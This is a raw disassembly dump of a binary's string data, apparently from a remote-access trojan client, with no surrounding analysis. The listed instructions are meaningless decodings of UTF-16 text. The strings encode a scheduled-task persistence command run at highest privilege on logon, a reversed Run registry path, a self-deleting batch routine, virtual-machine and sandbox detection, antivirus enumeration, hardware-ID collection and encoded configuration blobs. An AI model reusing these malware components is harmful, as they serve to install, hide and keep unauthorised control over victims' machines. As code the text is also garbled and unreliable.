  40b69c:	76 00                	jbe    0x40b69e
  40b69e:	34 00                	xor    $0x0,%al
  40b6a0:	49                   	dec    %ecx
  40b6a1:	00 47 00             	add    %al,0x0(%edi)
  40b6a4:	4b                   	dec    %ebx
  40b6a5:	00 36                	add    %dh,(%esi)
  40b6a7:	00 6a 00             	add    %ch,0x0(%edx)
  40b6aa:	56                   	push   %esi
  40b6ab:	00 45 00             	add    %al,0x0(%ebp)
  40b6ae:	51                   	push   %ecx
  40b6af:	00 74 00 5a          	add    %dh,0x5a(%eax,%eax,1)
  40b6b3:	00 57 00             	add    %dl,0x0(%edi)
  40b6b6:	43                   	inc    %ebx
  40b6b7:	00 4b 00             	add    %cl,0x0(%ebx)
  40b6ba:	77 00                	ja     0x40b6bc
  40b6bc:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b6c1:	03 30                	add    (%eax),%esi
  40b6c3:	00 00                	add    %al,(%eax)
  40b6c5:	80 b1 64 00 4c 00 59 	xorb   $0x59,0x4c0064(%ecx)
  40b6cc:	00 4b 00             	add    %cl,0x0(%ebx)
  40b6cf:	64 00 46 00          	add    %al,%fs:0x0(%esi)
  40b6d3:	51                   	push   %ecx
  40b6d4:	00 58 00             	add    %bl,0x0(%eax)
  40b6d7:	44                   	inc    %esp
  40b6d8:	00 51 00             	add    %dl,0x0(%ecx)
  40b6db:	58                   	pop    %eax
  40b6dc:	00 69 00             	add    %ch,0x0(%ecx)
  40b6df:	45                   	inc    %ebp
  40b6e0:	00 4d 00             	add    %cl,0x0(%ebp)
  40b6e3:	31 00                	xor    %eax,(%eax)
  40b6e5:	56                   	push   %esi
  40b6e6:	00 72 00             	add    %dh,0x0(%edx)
  40b6e9:	49                   	dec    %ecx
  40b6ea:	00 70 00             	add    %dh,0x0(%eax)
  40b6ed:	2f                   	das
  40b6ee:	00 47 00             	add    %al,0x0(%edi)
  40b6f1:	70 00                	jo     0x40b6f3
  40b6f3:	55                   	push   %ebp
  40b6f4:	00 53 00             	add    %dl,0x0(%ebx)
  40b6f7:	72 00                	jb     0x40b6f9
  40b6f9:	75 00                	jne    0x40b6fb
  40b6fb:	58                   	pop    %eax
  40b6fc:	00 6b 00             	add    %ch,0x0(%ebx)
  40b6ff:	7a 00                	jp     0x40b701
  40b701:	38 00                	cmp    %al,(%eax)
  40b703:	79 00                	jns    0x40b705
  40b705:	36 00 47 00          	add    %al,%ss:0x0(%edi)
  40b709:	79 00                	jns    0x40b70b
  40b70b:	46                   	inc    %esi
  40b70c:	00 31                	add    %dh,(%ecx)
  40b70e:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  40b712:	00 43 00             	add    %al,0x0(%ebx)
  40b715:	45                   	inc    %ebp
  40b716:	00 4a 00             	add    %cl,0x0(%edx)
  40b719:	64 00 54 00 44       	add    %dl,%fs:0x44(%eax,%eax,1)
  40b71e:	00 59 00             	add    %bl,0x0(%ecx)
  40b721:	77 00                	ja     0x40b723
  40b723:	58                   	pop    %eax
  40b724:	00 57 00             	add    %dl,0x0(%edi)
  40b727:	37                   	aaa
  40b728:	00 47 00             	add    %al,0x0(%edi)
  40b72b:	36 00 6e 00          	add    %ch,%ss:0x0(%esi)
  40b72f:	6c                   	insb   (%dx),%es:(%edi)
  40b730:	00 2b                	add    %ch,(%ebx)
  40b732:	00 4a 00             	add    %cl,0x0(%edx)
  40b735:	49                   	dec    %ecx
  40b736:	00 7a 00             	add    %bh,0x0(%edx)
  40b739:	35 00 70 00 56       	xor    $0x56007000,%eax
  40b73e:	00 64 00 5a          	add    %ah,0x5a(%eax,%eax,1)
  40b742:	00 43 00             	add    %al,0x0(%ebx)
  40b745:	51                   	push   %ecx
  40b746:	00 46 00             	add    %al,0x0(%esi)
  40b749:	4b                   	dec    %ebx
  40b74a:	00 43 00             	add    %al,0x0(%ebx)
  40b74d:	5a                   	pop    %edx
  40b74e:	00 38                	add    %bh,(%eax)
  40b750:	00 69 00             	add    %ch,0x0(%ecx)
  40b753:	6e                   	outsb  %ds:(%esi),(%dx)
  40b754:	00 58 00             	add    %bl,0x0(%eax)
  40b757:	2f                   	das
  40b758:	00 45 00             	add    %al,0x0(%ebp)
  40b75b:	2b 00                	sub    (%eax),%eax
  40b75d:	34 00                	xor    $0x0,%al
  40b75f:	4a                   	dec    %edx
  40b760:	00 79 00             	add    %bh,0x0(%ecx)
  40b763:	79 00                	jns    0x40b765
  40b765:	69 00 31 00 30 00    	imul   $0x300031,(%eax),%eax
  40b76b:	30 00                	xor    %al,(%eax)
  40b76d:	36 00 50 00          	add    %dl,%ss:0x0(%eax)
  40b771:	77 00                	ja     0x40b773
  40b773:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b778:	09 6e 00             	or     %ebp,0x0(%esi)
  40b77b:	75 00                	jne    0x40b77d
  40b77d:	6c                   	insb   (%dx),%es:(%edi)
  40b77e:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b782:	01 00                	add    %eax,(%eax)
  40b784:	03 3a                	add    (%edx),%edi
  40b786:	00 00                	add    %al,(%eax)
  40b788:	0d 50 00 61 00       	or     $0x610050,%eax
  40b78d:	63 00                	arpl   %eax,(%eax)
  40b78f:	6b 00 65             	imul   $0x65,(%eax),%eax
  40b792:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b796:	09 50 00             	or     %edx,0x0(%eax)
  40b799:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40b79f:	00 0f                	add    %cl,(%edi)
  40b7a1:	4d                   	dec    %ebp
  40b7a2:	00 65 00             	add    %ah,0x0(%ebp)
  40b7a5:	73 00                	jae    0x40b7a7
  40b7a7:	73 00                	jae    0x40b7a9
  40b7a9:	61                   	popa
  40b7aa:	00 67 00             	add    %ah,0x0(%edi)
  40b7ad:	65 00 00             	add    %al,%gs:(%eax)
  40b7b0:	07                   	pop    %es
  40b7b1:	63 00                	arpl   %eax,(%eax)
  40b7b3:	6d                   	insl   (%dx),%es:(%edi)
  40b7b4:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40b7b8:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40b7be:	00 73 00             	add    %dh,0x0(%ebx)
  40b7c1:	63 00                	arpl   %eax,(%eax)
  40b7c3:	68 00 74 00 61       	push   $0x61007400
  40b7c8:	00 73 00             	add    %dh,0x0(%ebx)
  40b7cb:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b7ce:	00 20                	add    %ah,(%eax)
  40b7d0:	00 2f                	add    %ch,(%edi)
  40b7d2:	00 63 00             	add    %ah,0x0(%ebx)
  40b7d5:	72 00                	jb     0x40b7d7
  40b7d7:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40b7db:	74 00                	je     0x40b7dd
  40b7dd:	65 00 20             	add    %ah,%gs:(%eax)
  40b7e0:	00 2f                	add    %ch,(%edi)
  40b7e2:	00 66 00             	add    %ah,0x0(%esi)
  40b7e5:	20 00                	and    %al,(%eax)
  40b7e7:	2f                   	das
  40b7e8:	00 73 00             	add    %dh,0x0(%ebx)
  40b7eb:	63 00                	arpl   %eax,(%eax)
  40b7ed:	20 00                	and    %al,(%eax)
  40b7ef:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7f0:	00 6e 00             	add    %ch,0x0(%esi)
  40b7f3:	6c                   	insb   (%dx),%es:(%edi)
  40b7f4:	00 6f 00             	add    %ch,0x0(%edi)
  40b7f7:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b7fb:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7fc:	00 20                	add    %ah,(%eax)
  40b7fe:	00 2f                	add    %ch,(%edi)
  40b800:	00 72 00             	add    %dh,0x0(%edx)
  40b803:	6c                   	insb   (%dx),%es:(%edi)
  40b804:	00 20                	add    %ah,(%eax)
  40b806:	00 68 00             	add    %ch,0x0(%eax)
  40b809:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40b80f:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b813:	74 00                	je     0x40b815
  40b815:	20 00                	and    %al,(%eax)
  40b817:	2f                   	das
  40b818:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40b81c:	00 20                	add    %ah,(%eax)
  40b81e:	00 22                	add    %ah,(%edx)
  40b820:	00 00                	add    %al,(%eax)
  40b822:	11 22                	adc    %esp,(%edx)
  40b824:	00 20                	add    %ah,(%eax)
  40b826:	00 2f                	add    %ch,(%edi)
  40b828:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40b82c:	00 20                	add    %ah,(%eax)
  40b82e:	00 27                	add    %ah,(%edi)
  40b830:	00 22                	add    %ah,(%edx)
  40b832:	00 01                	add    %al,(%ecx)
  40b834:	13 22                	adc    (%edx),%esp
  40b836:	00 27                	add    %ah,(%edi)
  40b838:	00 20                	add    %ah,(%eax)
  40b83a:	00 26                	add    %ah,(%esi)
  40b83c:	00 20                	add    %ah,(%eax)
  40b83e:	00 65 00             	add    %ah,0x0(%ebp)
  40b841:	78 00                	js     0x40b843
  40b843:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40b849:	5c                   	pop    %esp
  40b84a:	00 6e 00             	add    %ch,0x0(%esi)
  40b84d:	75 00                	jne    0x40b84f
  40b84f:	52                   	push   %edx
  40b850:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40b854:	00 6f 00             	add    %ch,0x0(%edi)
  40b857:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40b85d:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40b861:	74 00                	je     0x40b863
  40b863:	6e                   	outsb  %ds:(%esi),(%dx)
  40b864:	00 65 00             	add    %ah,0x0(%ebp)
  40b867:	72 00                	jb     0x40b869
  40b869:	72 00                	jb     0x40b86b
  40b86b:	75 00                	jne    0x40b86d
  40b86d:	43                   	inc    %ebx
  40b86e:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40b872:	00 77 00             	add    %dh,0x0(%edi)
  40b875:	6f                   	outsl  %ds:(%esi),(%dx)
  40b876:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40b87a:	00 69 00             	add    %ch,0x0(%ecx)
  40b87d:	57                   	push   %edi
  40b87e:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40b882:	00 66 00             	add    %ah,0x0(%esi)
  40b885:	6f                   	outsl  %ds:(%esi),(%dx)
  40b886:	00 73 00             	add    %dh,0x0(%ebx)
  40b889:	6f                   	outsl  %ds:(%esi),(%dx)
  40b88a:	00 72 00             	add    %dh,0x0(%edx)
  40b88d:	63 00                	arpl   %eax,(%eax)
  40b88f:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40b895:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b899:	61                   	popa
  40b89a:	00 77 00             	add    %dh,0x0(%edi)
  40b89d:	74 00                	je     0x40b89f
  40b89f:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b8a3:	53                   	push   %ebx
  40b8a4:	00 00                	add    %al,(%eax)
  40b8a6:	03 22                	add    (%edx),%esp
  40b8a8:	00 00                	add    %al,(%eax)
  40b8aa:	09 2e                	or     %ebp,(%esi)
  40b8ac:	00 62 00             	add    %ah,0x0(%edx)
  40b8af:	61                   	popa
  40b8b0:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b8b4:	13 40 00             	adc    0x0(%eax),%eax
  40b8b7:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b8bb:	68 00 6f 00 20       	push   $0x20006f00
  40b8c0:	00 6f 00             	add    %ch,0x0(%edi)
  40b8c3:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40b8c7:	00 1f                	add    %bl,(%edi)
  40b8c9:	74 00                	je     0x40b8cb
  40b8cb:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40b8d1:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8d2:	00 75 00             	add    %dh,0x0(%ebp)
  40b8d5:	74 00                	je     0x40b8d7
  40b8d7:	20 00                	and    %al,(%eax)
  40b8d9:	33 00                	xor    (%eax),%eax
  40b8db:	20 00                	and    %al,(%eax)
  40b8dd:	3e 00 20             	add    %ah,%ds:(%eax)
  40b8e0:	00 4e 00             	add    %cl,0x0(%esi)
  40b8e3:	55                   	push   %ebp
  40b8e4:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b8e8:	15 53 00 54 00       	adc    $0x540053,%eax
  40b8ed:	41                   	inc    %ecx
  40b8ee:	00 52 00             	add    %dl,0x0(%edx)
  40b8f1:	54                   	push   %esp
  40b8f2:	00 20                	add    %ah,(%eax)
  40b8f4:	00 22                	add    %ah,(%edx)
  40b8f6:	00 22                	add    %ah,(%edx)
  40b8f8:	00 20                	add    %ah,(%eax)
  40b8fa:	00 22                	add    %ah,(%edx)
  40b8fc:	00 00                	add    %al,(%eax)
  40b8fe:	07                   	pop    %es
  40b8ff:	43                   	inc    %ebx
  40b900:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40b904:	00 00                	add    %al,(%eax)
  40b906:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40b90a:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40b90e:	00 22                	add    %ah,(%edx)
  40b910:	00 00                	add    %al,(%eax)
  40b912:	0f 22 00             	mov    %eax,%cr0
  40b915:	20 00                	and    %al,(%eax)
  40b917:	2f                   	das
  40b918:	00 66 00             	add    %ah,0x0(%esi)
  40b91b:	20 00                	and    %al,(%eax)
  40b91d:	2f                   	das
  40b91e:	00 71 00             	add    %dh,0x0(%ecx)
  40b921:	00 05 78 00 70 00    	add    %al,0x700078
  40b927:	00 45 53             	add    %al,0x53(%ebp)
  40b92a:	00 65 00             	add    %ah,0x0(%ebp)
  40b92d:	6c                   	insb   (%dx),%es:(%edi)
  40b92e:	00 65 00             	add    %ah,0x0(%ebp)
  40b931:	63 00                	arpl   %eax,(%eax)
  40b933:	74 00                	je     0x40b935
  40b935:	20 00                	and    %al,(%eax)
  40b937:	2a 00                	sub    (%eax),%al
  40b939:	20 00                	and    %al,(%eax)
  40b93b:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40b93f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b940:	00 6d 00             	add    %ch,0x0(%ebp)
  40b943:	20 00                	and    %al,(%eax)
  40b945:	57                   	push   %edi
  40b946:	00 69 00             	add    %ch,0x0(%ecx)
  40b949:	6e                   	outsb  %ds:(%esi),(%dx)
  40b94a:	00 33                	add    %dh,(%ebx)
  40b94c:	00 32                	add    %dh,(%edx)
  40b94e:	00 5f 00             	add    %bl,0x0(%edi)
  40b951:	43                   	inc    %ebx
  40b952:	00 6f 00             	add    %ch,0x0(%edi)
  40b955:	6d                   	insl   (%dx),%es:(%edi)
  40b956:	00 70 00             	add    %dh,0x0(%eax)
  40b959:	75 00                	jne    0x40b95b
  40b95b:	74 00                	je     0x40b95d
  40b95d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b961:	53                   	push   %ebx
  40b962:	00 79 00             	add    %bh,0x0(%ecx)
  40b965:	73 00                	jae    0x40b967
  40b967:	74 00                	je     0x40b969
  40b969:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40b96d:	00 19                	add    %bl,(%ecx)
  40b96f:	4d                   	dec    %ebp
  40b970:	00 61 00             	add    %ah,0x0(%ecx)
  40b973:	6e                   	outsb  %ds:(%esi),(%dx)
  40b974:	00 75 00             	add    %dh,0x0(%ebp)
  40b977:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40b97b:	63 00                	arpl   %eax,(%eax)
  40b97d:	74 00                	je     0x40b97f
  40b97f:	75 00                	jne    0x40b981
  40b981:	72 00                	jb     0x40b983
  40b983:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b987:	00 2b                	add    %ch,(%ebx)
  40b989:	6d                   	insl   (%dx),%es:(%edi)
  40b98a:	00 69 00             	add    %ch,0x0(%ecx)
  40b98d:	63 00                	arpl   %eax,(%eax)
  40b98f:	72 00                	jb     0x40b991
  40b991:	6f                   	outsl  %ds:(%esi),(%dx)
  40b992:	00 73 00             	add    %dh,0x0(%ebx)
  40b995:	6f                   	outsl  %ds:(%esi),(%dx)
  40b996:	00 66 00             	add    %ah,0x0(%esi)
  40b999:	74 00                	je     0x40b99b
  40b99b:	20 00                	and    %al,(%eax)
  40b99d:	63 00                	arpl   %eax,(%eax)
  40b99f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9a0:	00 72 00             	add    %dh,0x0(%edx)
  40b9a3:	70 00                	jo     0x40b9a5
  40b9a5:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9a6:	00 72 00             	add    %dh,0x0(%edx)
  40b9a9:	61                   	popa
  40b9aa:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b9ae:	00 6f 00             	add    %ch,0x0(%edi)
  40b9b1:	6e                   	outsb  %ds:(%esi),(%dx)
  40b9b2:	00 00                	add    %al,(%eax)
  40b9b4:	0b 4d 00             	or     0x0(%ebp),%ecx
  40b9b7:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9b8:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b9bc:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b9c0:	0f 56 00             	orps   (%eax),%xmm0
  40b9c3:	49                   	dec    %ecx
  40b9c4:	00 52 00             	add    %dl,0x0(%edx)
  40b9c7:	54                   	push   %esp
  40b9c8:	00 55 00             	add    %dl,0x0(%ebp)
  40b9cb:	41                   	inc    %ecx
  40b9cc:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b9d0:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40b9d5:	77 00                	ja     0x40b9d7
  40b9d7:	61                   	popa
  40b9d8:	00 72 00             	add    %dh,0x0(%edx)
  40b9db:	65 00 00             	add    %al,%gs:(%eax)
  40b9de:	15 56 00 69 00       	adc    $0x690056,%eax
  40b9e3:	72 00                	jb     0x40b9e5
  40b9e5:	74 00                	je     0x40b9e7
  40b9e7:	75 00                	jne    0x40b9e9
  40b9e9:	61                   	popa
  40b9ea:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40b9ee:	00 6f 00             	add    %ch,0x0(%edi)
  40b9f1:	78 00                	js     0x40b9f3
  40b9f3:	00 17                	add    %dl,(%edi)
  40b9f5:	53                   	push   %ebx
  40b9f6:	00 62 00             	add    %ah,0x0(%edx)
  40b9f9:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40b9ff:	6c                   	insb   (%dx),%es:(%edi)
  40ba00:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40ba04:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40ba08:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40ba0c:	11 45 00             	adc    %eax,0x0(%ebp)
  40ba0f:	72 00                	jb     0x40ba11
  40ba11:	72 00                	jb     0x40ba13
  40ba13:	20 00                	and    %al,(%eax)
  40ba15:	48                   	dec    %eax
  40ba16:	00 57 00             	add    %dl,0x0(%edi)
  40ba19:	49                   	dec    %ecx
  40ba1a:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40ba1e:	05 78 00 32 00       	add    $0x320078,%eax
  40ba23:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40ba29:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40ba2f:	74 00                	je     0x40ba31
  40ba31:	49                   	dec    %ecx
  40ba32:	00 6e 00             	add    %ch,0x0(%esi)
  40ba35:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40ba39:	00 09                	add    %cl,(%ecx)
  40ba3b:	48                   	dec    %eax
  40ba3c:	00 57 00             	add    %dl,0x0(%edi)
  40ba3f:	49                   	dec    %ecx
  40ba40:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40ba44:	09 55 00             	or     %edx,0x0(%ebp)
  40ba47:	73 00                	jae    0x40ba49
  40ba49:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ba4d:	00 05 4f 00 53 00    	add    %al,0x53004f
  40ba53:	00 13                	add    %dl,(%ebx)
  40ba55:	4d                   	dec    %ebp
  40ba56:	00 69 00             	add    %ch,0x0(%ecx)
  40ba59:	63 00                	arpl   %eax,(%eax)
  40ba5b:	72 00                	jb     0x40ba5d
  40ba5d:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba5e:	00 73 00             	add    %dh,0x0(%ebx)
  40ba61:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba62:	00 66 00             	add    %ah,0x0(%esi)
  40ba65:	74 00                	je     0x40ba67
  40ba67:	00 03                	add    %al,(%ebx)
  40ba69:	20 00                	and    %al,(%eax)
  40ba6b:	00 09                	add    %cl,(%ecx)
  40ba6d:	54                   	push   %esp
  40ba6e:	00 72 00             	add    %dh,0x0(%edx)
  40ba71:	75 00                	jne    0x40ba73
  40ba73:	65 00 00             	add    %al,%gs:(%eax)
  40ba76:	0b 36                	or     (%esi),%esi
  40ba78:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ba7b:	62 00                	bound  %eax,(%eax)
  40ba7d:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40ba83:	46                   	inc    %esi
  40ba84:	00 61 00             	add    %ah,0x0(%ecx)
  40ba87:	6c                   	insb   (%dx),%es:(%edi)
  40ba88:	00 73 00             	add    %dh,0x0(%ebx)
  40ba8b:	65 00 00             	add    %al,%gs:(%eax)
  40ba8e:	0b 33                	or     (%ebx),%esi
  40ba90:	00 32                	add    %dh,(%edx)
  40ba92:	00 62 00             	add    %ah,0x0(%edx)
  40ba95:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40ba9b:	50                   	push   %eax
  40ba9c:	00 61 00             	add    %ah,0x0(%ecx)
  40ba9f:	74 00                	je     0x40baa1
  40baa1:	68 00 00 0f 56       	push   $0x560f0000
  40baa6:	00 65 00             	add    %ah,0x0(%ebp)
  40baa9:	72 00                	jb     0x40baab
  40baab:	73 00                	jae    0x40baad
  40baad:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40bab3:	00 0b                	add    %cl,(%ebx)
  40bab5:	41                   	inc    %ecx
  40bab6:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40baba:	00 69 00             	add    %ch,0x0(%ecx)
  40babd:	6e                   	outsb  %ds:(%esi),(%dx)
  40babe:	00 00                	add    %al,(%eax)
  40bac0:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40bac4:	00 75 00             	add    %dh,0x0(%ebp)
  40bac7:	65 00 00             	add    %al,%gs:(%eax)
  40baca:	0b 66 00             	or     0x0(%esi),%esp
  40bacd:	61                   	popa
  40bace:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40bad2:	00 65 00             	add    %ah,0x0(%ebp)
  40bad5:	00 17                	add    %dl,(%edi)
  40bad7:	50                   	push   %eax
  40bad8:	00 65 00             	add    %ah,0x0(%ebp)
  40badb:	72 00                	jb     0x40badd
  40badd:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40bae1:	72 00                	jb     0x40bae3
  40bae3:	6d                   	insl   (%dx),%es:(%edi)
  40bae4:	00 61 00             	add    %ah,0x0(%ecx)
  40bae7:	6e                   	outsb  %ds:(%esi),(%dx)
  40bae8:	00 63 00             	add    %ah,0x0(%ebx)
  40baeb:	65 00 00             	add    %al,%gs:(%eax)
  40baee:	11 50 00             	adc    %edx,0x0(%eax)
  40baf1:	61                   	popa
  40baf2:	00 73 00             	add    %dh,0x0(%ebx)
  40baf5:	74 00                	je     0x40baf7
  40baf7:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40bafb:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40bb01:	41                   	inc    %ecx
  40bb02:	00 6e 00             	add    %ch,0x0(%esi)
  40bb05:	74 00                	je     0x40bb07
  40bb07:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40bb0d:	72 00                	jb     0x40bb0f
  40bb0f:	75 00                	jne    0x40bb11
  40bb11:	73 00                	jae    0x40bb13
  40bb13:	00 13                	add    %dl,(%ebx)
  40bb15:	49                   	dec    %ecx
  40bb16:	00 6e 00             	add    %ch,0x0(%esi)
  40bb19:	73 00                	jae    0x40bb1b
  40bb1b:	74 00                	je     0x40bb1d
  40bb1d:	61                   	popa
  40bb1e:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bb22:	00 65 00             	add    %ah,0x0(%ebp)
  40bb25:	64 00 00             	add    %al,%fs:(%eax)
  40bb28:	09 50 00             	or     %edx,0x0(%eax)
  40bb2b:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb2c:	00 6e 00             	add    %ch,0x0(%esi)
  40bb2f:	67 00 00             	add    %al,(%bx,%si)
  40bb32:	0b 47 00             	or     0x0(%edi),%eax
  40bb35:	72 00                	jb     0x40bb37
  40bb37:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb38:	00 75 00             	add    %dh,0x0(%ebp)
  40bb3b:	70 00                	jo     0x40bb3d
  40bb3d:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40bb43:	00 2b                	add    %ch,(%ebx)
  40bb45:	5c                   	pop    %esp
  40bb46:	00 72 00             	add    %dh,0x0(%edx)
  40bb49:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb4a:	00 6f 00             	add    %ch,0x0(%edi)
  40bb4d:	74 00                	je     0x40bb4f
  40bb4f:	5c                   	pop    %esp
  40bb50:	00 53 00             	add    %dl,0x0(%ebx)
  40bb53:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bb57:	75 00                	jne    0x40bb59
  40bb59:	72 00                	jb     0x40bb5b
  40bb5b:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40bb61:	43                   	inc    %ebx
  40bb62:	00 65 00             	add    %ah,0x0(%ebp)
  40bb65:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb66:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40bb6a:	00 72 00             	add    %dh,0x0(%edx)
  40bb6d:	32 00                	xor    (%eax),%al
  40bb6f:	00 3d 53 00 65 00    	add    %bh,0x650053
  40bb75:	6c                   	insb   (%dx),%es:(%edi)
  40bb76:	00 65 00             	add    %ah,0x0(%ebp)
  40bb79:	63 00                	arpl   %eax,(%eax)
  40bb7b:	74 00                	je     0x40bb7d
  40bb7d:	20 00                	and    %al,(%eax)
  40bb7f:	2a 00                	sub    (%eax),%al
  40bb81:	20 00                	and    %al,(%eax)
  40bb83:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40bb87:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb88:	00 6d 00             	add    %ch,0x0(%ebp)
  40bb8b:	20 00                	and    %al,(%eax)
  40bb8d:	41                   	inc    %ecx
  40bb8e:	00 6e 00             	add    %ch,0x0(%esi)
  40bb91:	74 00                	je     0x40bb93
  40bb93:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40bb99:	72 00                	jb     0x40bb9b
  40bb9b:	75 00                	jne    0x40bb9d
  40bb9d:	73 00                	jae    0x40bb9f
  40bb9f:	50                   	push   %eax
  40bba0:	00 72 00             	add    %dh,0x0(%edx)
  40bba3:	6f                   	outsl  %ds:(%esi),(%dx)
  40bba4:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40bba8:	00 63 00             	add    %ah,0x0(%ebx)
  40bbab:	74 00                	je     0x40bbad
  40bbad:	00 17                	add    %dl,(%edi)
  40bbaf:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40bbb3:	73 00                	jae    0x40bbb5
  40bbb5:	70 00                	jo     0x40bbb7
  40bbb7:	6c                   	insb   (%dx),%es:(%edi)
  40bbb8:	00 61 00             	add    %ah,0x0(%ecx)
  40bbbb:	79 00                	jns    0x40bbbd
  40bbbd:	4e                   	dec    %esi
  40bbbe:	00 61 00             	add    %ah,0x0(%ecx)
  40bbc1:	6d                   	insl   (%dx),%es:(%edi)
  40bbc2:	00 65 00             	add    %ah,0x0(%ebp)
  40bbc5:	00 07                	add    %al,(%edi)
  40bbc7:	4e                   	dec    %esi
  40bbc8:	00 2f                	add    %ch,(%edi)
  40bbca:	00 41 00             	add    %al,0x0(%ecx)
  40bbcd:	00 05 2c 00 20 00    	add    %al,0x20002c
  40bbd3:	00 13                	add    %dl,(%ebx)
  40bbd5:	53                   	push   %ebx
  40bbd6:	00 6f 00             	add    %ch,0x0(%edi)
  40bbd9:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40bbde:	00 61 00             	add    %ah,0x0(%ecx)
  40bbe1:	72 00                	jb     0x40bbe3
  40bbe3:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40bbe8:	09 70 00             	or     %esi,0x0(%eax)
  40bbeb:	6f                   	outsl  %ds:(%esi),(%dx)
  40bbec:	00 6e 00             	add    %ch,0x0(%esi)
  40bbef:	67 00 00             	add    %al,(%bx,%si)
  40bbf2:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40bbf7:	75 00                	jne    0x40bbf9
  40bbf9:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bbfd:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbfe:	00 00                	add    %al,(%eax)
  40bc00:	15 73 00 61 00       	adc    $0x610073,%eax
  40bc05:	76 00                	jbe    0x40bc07
  40bc07:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
